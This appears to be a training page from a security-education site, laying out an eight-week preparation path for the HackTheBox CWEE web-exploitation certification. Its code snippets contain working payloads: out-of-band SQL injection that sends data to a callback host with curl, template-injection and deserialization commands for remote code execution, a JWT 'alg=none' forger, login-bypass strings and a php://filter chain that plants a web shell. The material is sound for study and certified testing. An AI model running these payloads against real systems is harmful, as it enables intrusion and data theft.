---
layout: training-page
title: "HTB CWEE Preparation Path — Red Team Academy"
module: "Learning Paths"
tags:
  - htb
  - cwee
  - web-exploitation
  - bug-bounty
  - learning-path
page_key: "learning-paths-htb-cwee-prep"
render_with_liquid: false
---

# HTB CWEE Preparation Path — 6 to 8 Weeks

The HackTheBox Certified Web Exploitation Expert (CWEE) is the most demanding pure web certification in the industry as of 2026. It is the deep-web counterpart to CPTS — instead of an engagement chain across network segments, CWEE drops you into hardened web targets that require manual source-code analysis, custom exploit development, and chained vulnerability discovery. Burp Suite alone will not get you through. You will read application source code, write exploit scripts in Python and JavaScript, and chain three to five bugs together to reach RCE.

This path is purpose-built for two audiences: high-end bug-bounty hunters who want to formalize their skill, and pentesters who want to specialize on the application security side. It is not a starter path.

---

## CWEE Exam Overview

| Parameter | Detail |
|---|---|
| Duration | 7 days active engagement + 3 days report writing |
| Environment | Multiple complex web applications with source code provided |
| Scoring | Flags + professional commercial-grade report |
| Pass threshold | ≥80% (combined flag capture + report quality) |
| Allowed tools | Any — manual exploitation expected, automated scanners discouraged |
| Retake | One free retake included |
| Source code | Provided for some targets — whitebox + blackbox mix |
| Style | Real-world application security audit, not a CTF |

The exam tests skills in the order they show up in a real assessment:

1. **Application mapping** — fingerprinting, routing analysis, technology stack identification
2. **Manual vulnerability discovery** — both blackbox testing and whitebox source review
3. **Exploit chaining** — combining 3–5 low/medium bugs into a critical impact path
4. **Custom exploit development** — Python, JavaScript, or framework-specific payload scripting
5. **Professional reporting** — commercial-grade writeups suitable for client delivery

CWEE does not have a buffer overflow component, does not require Active Directory, and does not include network pivoting. It is exclusively web.

---

## Prerequisites Checklist

Before starting week 1, confirm you can:
- [ ] Read PHP, Python, and JavaScript source code well enough to spot a SQL injection in a 200-line file
- [ ] Modify a Burp Suite request manually and explain every header
- [ ] Write a 50-line Python exploit script using `requests` with sessions and async
- [ ] Recognise common framework patterns — Flask, Express, Spring, Laravel
- [ ] Set up a local web app stack (Docker compose, npm, pip)
- [ ] Have completed CPTS, OSWE, or equivalent web-heavy experience

If you cannot read code fluently in at least two of PHP/Python/JavaScript, do not start CWEE — go to HTB Academy's "Bug Bounty Hunter" job-role path first and come back when you can.

---

## Week 1: Modern Web Stack and Whitebox Methodology

**Goal:** Build the source-code-first methodology you will use across the entire path. Get fluent with reading unfamiliar code under time pressure.

### Required HTB Academy Modules

| Module | Focus |
|---|---|
| Whitebox Pentesting 101 | Source code review methodology, threat modeling, hotspot analysis |
| Modern Web Exploitation Techniques | Modern stack overview, framework patterns, ORM/SQL boundary issues |

### Required RTA Pages

| Page | Focus |
|---|---|
| [/web/source-review](/web/source-review) | Whitebox methodology, dangerous sinks, source-to-sink tracing |
| [/web/web-fingerprinting](/web/web-fingerprinting) | Tech stack identification, framework signature detection |
| [/web/bug-bounty-methodology](/web/bug-bounty-methodology) | End-to-end assessment workflow |

### Source Review Workflow

When source is provided, follow this order every time:

1. **Map routes** — find the router or URL config file, list every endpoint
2. **Identify auth boundaries** — which routes require auth, which don't
3. **Identify sinks** — `exec`, `system`, `eval`, raw SQL string concat, file operations, deserialization
4. **Trace sources to sinks** — for each sink, walk backward to find user input
5. **Note interesting libraries** — old versions of `node-serialize`, `pickle`, `marshalling` libs are red flags

```bash
# Fast sink discovery
grep -rn "eval\|exec\|system\|popen\|shell_exec\|passthru" --include="*.php" .
grep -rn "innerHTML\|document.write\|eval(" --include="*.js" .
grep -rn "subprocess\|os.system\|pickle.loads\|yaml.load" --include="*.py" .
grep -rn "Runtime.getRuntime\|ProcessBuilder\|ObjectInputStream" --include="*.java" .

# Then trace user input
grep -rn "\$_GET\|\$_POST\|\$_REQUEST" --include="*.php" .
grep -rn "req.body\|req.query\|req.params" --include="*.js" .
grep -rn "request.args\|request.form\|request.json" --include="*.py" .
```

---

## Week 2: Advanced SQL Injection

**Goal:** Move past sqlmap. Discover and exploit SQLi where automated tools fail, including second-order, NoSQL, and ORM-bypass cases.

### Required HTB Academy Modules

| Module | Focus |
|---|---|
| Advanced SQL Injections | Second-order, out-of-band, NoSQL injection, WAF bypass |

### Required RTA Pages

| Page | Focus |
|---|---|
| [/web/sql-injection](/web/sql-injection) | Manual SQLi fundamentals — UNION, error-based, blind |
| [/web/sqli-advanced](/web/sqli-advanced) | Second-order, OOB, time-based blind, WAF bypass |
| [/web/nosql-injection](/web/nosql-injection) | MongoDB, CouchDB injection patterns |
| [/web/orm-bypass](/web/orm-bypass) | Sequelize, Hibernate, Django ORM injection patterns |

### Second-Order SQLi Pattern

Second-order SQLi is a CWEE favorite. Pattern:

1. Attacker submits a malicious string in a "safe" sink (e.g., user registration)
2. Application escapes it on insert
3. Later, a different code path reads the value and uses it in a raw query without re-escaping

```sql
-- Registration field stored escaped
admin'-- 

-- Later query (no re-escape on read)
SELECT * FROM users WHERE username = 'admin'-- ' AND role='member'
-- Executes as: SELECT * FROM users WHERE username = 'admin'
```

### OOB Exfiltration for Blind SQLi

```sql
-- MSSQL example
'; exec master..xp_dirtree '\\<your_dns_canary>.oast.live\share'--

-- MySQL
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT @@version), '.<dns_canary>.oast.live\\share'))

-- PostgreSQL
COPY (SELECT current_user) TO PROGRAM 'curl http://<canary>/$(whoami)'
```

Use [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) or [interactsh](https://github.com/projectdiscovery/interactsh) as the OOB canary.

---

## Week 3: Cross-Site Scripting and Client-Side Attacks

**Goal:** Go beyond `<script>alert(1)</script>`. Exploit DOM-based XSS, prototype pollution, postMessage abuse, and modern framework-specific XSS.

### Required HTB Academy Modules

| Module | Focus |
|---|---|
| Cross-Site Scripting (XSS) | Reflected, stored, DOM-based |
| Advanced XSS & CSRF Exploitation | DOM clobbering, mutation XSS, framework escapes |
| Prototype Pollution | Client and server-side JS prototype pollution |

### Required RTA Pages

| Page | Focus |
|---|---|
| [/web/xss](/web/xss) | XSS fundamentals — reflected, stored, DOM |
| [/web/dom-xss](/web/dom-xss) | Source/sink analysis, taint flow, DOM-specific payloads |
| [/web/prototype-pollution](/web/prototype-pollution) | Client and server JS prototype pollution chains |
| [/web/csrf](/web/csrf) | CSRF token bypass, SameSite cookie abuse |
| [/web/postmessage-abuse](/web/postmessage-abuse) | Cross-origin postMessage, origin validation flaws |

### DOM XSS Sink Reference

Common DOM sinks to grep for during whitebox review:

```javascript
// Direct execution sinks
eval(userInput)
Function(userInput)
setTimeout(userInput)
setInterval(userInput)

// HTML injection sinks
element.innerHTML = userInput
element.outerHTML = userInput
document.write(userInput)
$(selector).html(userInput)

// URL sinks
location = userInput
location.href = userInput
window.open(userInput)

// Iframe srcdoc
iframe.srcdoc = userInput
```

### Prototype Pollution to RCE Chain

```javascript
// Client-side pollution via merge
const payload = JSON.parse('{"__proto__": {"isAdmin": true}}');
_.merge({}, payload);
({}).isAdmin === true; // polluted

// Server-side Node.js pollution to RCE via gadget
const payload = JSON.parse('{"__proto__": {"shell": "/bin/sh", "argv0": "id"}}');
// If app uses child_process.spawn with default options downstream → RCE
```

---

## Week 4: Server-Side Attacks — SSRF, Deserialization, SSTI

**Goal:** Identify and chain server-side bugs that lead to RCE without ever finding a "classic" RCE primitive.

### Required HTB Academy Modules

| Module | Focus |
|---|---|
| Server-Side Attacks | SSRF, SSI, ESI, request smuggling |
| Deserialization Attacks | PHP, Java, .NET, Python deserialization chains |
| Server-Side Template Injection | Jinja2, Twig, Freemarker, Velocity, Smarty |

### Required RTA Pages

| Page | Focus |
|---|---|
| [/web/ssrf](/web/ssrf) | SSRF fundamentals, blind SSRF, cloud metadata exfil |
| [/web/blind-ssrf](/web/blind-ssrf) | OOB techniques, DNS pivoting, internal port scan |
| [/web/ssti](/web/ssti) | Template injection across engines, sandbox escape |
| [/web/deserialization](/web/deserialization) | Java/PHP/.NET/Python gadget chains, ysoserial |
| [/web/request-smuggling](/web/request-smuggling) | CL.TE, TE.CL, TE.TE smuggling, browser desync |

### SSTI Detection Pattern

```python
# Universal SSTI probe — same payload across engines
{{7*'7'}}

# Engine fingerprint by output:
# Jinja2 / Twig 1.x      → '7777777' (string repeat)
# Freemarker / Velocity  → '49'      (numeric)
# Smarty                 → '7*7'     (no eval)
# Twig 2.x               → error

# Jinja2 RCE (most common in HTB)
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Java Freemarker
<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}

# .NET Razor
@System.Diagnostics.Process.Start("cmd", "/c id")
```

### Deserialization Gadget Chains

```bash
# Java with ysoserial
java -jar ysoserial.jar CommonsCollections5 'curl http://<canary>/' > payload.bin

# .NET with ysoserial.net
ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "calc.exe"

# PHP — find gadget chains via PHPGGC
phpggc Laravel/RCE10 system 'id' -b

# Python — pickle unsafe deserialization
python3 -c "import pickle, os; print(pickle.dumps(type('x', (), {'__reduce__': lambda s: (os.system, ('id',))})()))"
```

---

## Week 5: Authentication, Sessions, and JWT Attacks

**Goal:** Break authentication and session handling — both naive implementations and modern token-based systems (JWT, OAuth, SAML).

### Required HTB Academy Modules

| Module | Focus |
|---|---|
| Attacking Web Authentication | Session management, password reset abuse, MFA bypass |
| JSON Web Token Attacks | Alg confusion, null sig, key confusion, kid path traversal |
| OAuth 2.0 & OpenID Connect | OAuth flow abuse, redirect_uri attacks, state confusion |

### Required RTA Pages

| Page | Focus |
|---|---|
| [/web/auth-bypass](/web/auth-bypass) | Auth flaws, session handling, password reset attacks |
| [/web/jwt-attacks](/web/jwt-attacks) | Alg=none, key confusion, RS to HS, kid header tricks |
| [/web/oauth-attacks](/web/oauth-attacks) | redirect_uri abuse, state confusion, scope escalation |
| [/web/saml-attacks](/web/saml-attacks) | XML signature wrapping, comment confusion |

### JWT Attack Quickfire

```bash
# Decode without verifying
echo "<jwt>" | cut -d'.' -f2 | base64 -d 2>/dev/null

# alg=none attack
# Header: {"alg":"none","typ":"JWT"}
# Payload: {"user":"admin"}
# Signature: empty
python3 -c "import base64,json; h=base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'='); p=base64.urlsafe_b64encode(json.dumps({'user':'admin'}).encode()).rstrip(b'='); print(f'{h.decode()}.{p.decode()}.')"

# Algorithm confusion — RS256 → HS256 using public key as HMAC secret
# Get the public key from /.well-known/jwks.json or hidden in HTML
# Sign new JWT with HS256 using the public key contents as the secret

# Weak HMAC secret cracking
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

### Authentication Bypass Patterns

| Pattern | Test |
|---|---|
| Empty password accepted | `password=` |
| Null byte in username | `admin%00` |
| Array-based bypass (PHP) | `password[]=anything` |
| SQL injection in login | `' OR '1'='1'-- ` |
| Type juggling (PHP loose comparison) | `password=0`, `password=true` |
| Race condition on password reset | Multi-threaded reset request |

---

## Week 6: API and GraphQL Attacks

**Goal:** Audit REST and GraphQL APIs for IDOR, broken access control, BOLA/BFLA, and authorization bypass.

### Required HTB Academy Modules

| Module | Focus |
|---|---|
| Web Service & API Attacks | REST, SOAP, gRPC enumeration and abuse |
| GraphQL Attacks | Introspection, mutation abuse, batching attacks, rate-limit bypass |

### Required RTA Pages

| Page | Focus |
|---|---|
| [/web/api-attacks](/web/api-attacks) | API methodology, OWASP API Top 10, authorization bypass |
| [/web/graphql](/web/graphql) | GraphQL introspection, mutations, depth attacks |
| [/web/idor](/web/idor) | Object reference enumeration, BOLA, role bypass |
| [/web/mass-assignment](/web/mass-assignment) | Mass assignment, parameter pollution, hidden field abuse |

### GraphQL Reconnaissance

```bash
# Introspection — start here always
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}' \
  https://<target>/graphql

# Tools
graphql-cop -t https://<target>/graphql
graphw00f -d -f -t https://<target>/graphql
inql -t https://<target>/graphql -o report.html

# Batching attack — bypass rate limits
[{"query":"mutation { login(username:\"admin\",password:\"<p1>\") { token }}"},
 {"query":"mutation { login(username:\"admin\",password:\"<p2>\") { token }}"},
 ...up to 1000 in one request]
```

### IDOR Discovery Workflow

1. Enumerate every endpoint that takes an ID parameter
2. Identify the format — UUID, sequential int, slug, hash
3. Create two test accounts (A and B)
4. For each endpoint that returns or modifies user-owned data:
   - Authenticate as A
   - Replace A's ID with B's ID in the request
   - Check whether A can read/modify B's data

---

## Week 7: File Operations and Advanced Web RCE

**Goal:** Find RCE through file upload chains, path traversal, archive extraction (Zip-Slip), and template/render engine abuse.

### Required HTB Academy Modules

| Module | Focus |
|---|---|
| File Upload Attacks | Validation bypass, polyglots, mime confusion, race conditions |
| Advanced File Upload Attacks | Imagemagick chains, ffmpeg HLS, ZIP/TAR slip, race conditions |
| File Inclusion | LFI, RFI, log poisoning, php://filter chain |

### Required RTA Pages

| Page | Focus |
|---|---|
| [/web/file-upload](/web/file-upload) | Bypass techniques, double extension, mime confusion |
| [/web/zip-slip](/web/zip-slip) | Archive extraction path traversal |
| [/web/imagemagick](/web/imagemagick) | ImageTragick, MSL chain, profile chains |
| [/web/file-inclusion](/web/file-inclusion) | LFI, RFI, log poisoning, php://filter to RCE |

### LFI to RCE via php://filter Chain

The php://filter chain works even without log access — chain base64 + iconv to write arbitrary PHP via the include itself:

```bash
# Use phpfilterchaingenerator
python3 php_filter_chain_generator.py --chain '<?php system($_GET[0]); ?>'

# Then call the LFI with the generated chain
curl "http://<target>/?file=php://filter/convert.iconv.UTF8.CSISO2022KR|...|resource=/etc/passwd&0=id"
```

---

## Week 8: Exam Simulation and Report Writing

**Goal:** Run a full 7-day mock CWEE engagement, then produce a commercial-grade web pentest report.

### Required HTB Academy Modules

| Module | Focus |
|---|---|
| Documentation & Reporting | Report structure, executive summary, finding writeup |

### Required RTA Pages

| Page | Focus |
|---|---|
| [/reporting/findings](/reporting/findings) | Finding writeup, severity, evidence, remediation |
| [/reporting/report-templates](/reporting/report-templates) | Full commercial report templates |

### Mock Exam Targets

Choose from these to simulate the CWEE difficulty:

- HTB Academy "Bug Bounty Hunter" or "Web Exploitation Expert" labs
- PortSwigger Web Security Academy "Expert" labs
- Pentesterlab Pro "White Card" badges
- Real bug-bounty programs (use only programs that allow exploitation testing — Tesla, HackerOne public)

Run a 7-day timer per target. Document every step as you go, including dead ends — CWEE reports are judged on methodology, not just findings.

### CWEE Report Structure

```
1. Cover and scope
2. Executive summary (one page, non-technical)
3. Methodology
4. Findings (in order of severity)
   For each finding:
     - Title
     - Severity (Critical/High/Medium/Low/Info)
     - CVSS 3.1 vector + score
     - Affected endpoint(s)
     - Vulnerability description
     - Proof of concept (with screenshots and request/response)
     - Impact
     - Remediation
     - References (CWE, OWASP, vendor docs)
5. Attack chain narrative — explain how findings combined into critical impact
6. Appendices — full tool output, scope confirmation, retest checklist
```

### Severity Rubric for CWEE

| Severity | Web-Specific Criteria |
|---|---|
| Critical | Unauthenticated RCE, full database compromise, full account takeover at scale |
| High | Authenticated RCE, SSRF to cloud compromise, stored XSS in admin panel |
| Medium | Reflected XSS, IDOR exposing PII, weak session handling, CSRF on sensitive action |
| Low | Self-XSS, missing security headers, verbose error messages, weak TLS |
| Informational | Best-practice deviations, no direct exploit |

---

## Comparison to Other Web Certifications

| Dimension | CWEE | OSWE | CPTS (web portion) | Bug Bounty (general) |
|---|---|---|---|---|
| Provider | HackTheBox | OffSec | HackTheBox | N/A |
| Format | 7+3 day engagement | 48-hour exam | 10+4 day engagement | Ongoing programs |
| Depth | Highest in industry | High | Medium-High | Variable |
| Source code review | Required | Required | Optional | Rare |
| Custom exploit dev | Required | Required | Optional | Sometimes |
| Cost | Mid-high | High | Mid | Free to enter |
| Industry recognition | Growing rapidly | Established | Growing | Skill speaks louder than cert |

CWEE is the strongest pure-web cert available. If you only do one web cert, this is the one.

---

## Additional Resources

| Resource | Type | Cost |
|---|---|---|
| HTB Academy Web Exploitation Expert path | Official CWEE curriculum | Paid (cubes/subscription) |
| PortSwigger Web Security Academy | Free hands-on labs (expert tier) | Free |
| Pentesterlab Pro | Web exploitation labs by topic | Paid |
| OWASP Testing Guide | Reference methodology | Free |
| HackTricks (web sections) | Reference encyclopedia | Free |
| The Web Application Hacker's Handbook 2 | Foundational book | Paid book |
| Bug Bounty Bootcamp (Vickie Li) | Modern bug-bounty methodology | Paid book |
| LiveOverflow YouTube (web series) | Conceptual deep dives | Free |
| InsiderPhD YouTube | API and bug-bounty methodology | Free |
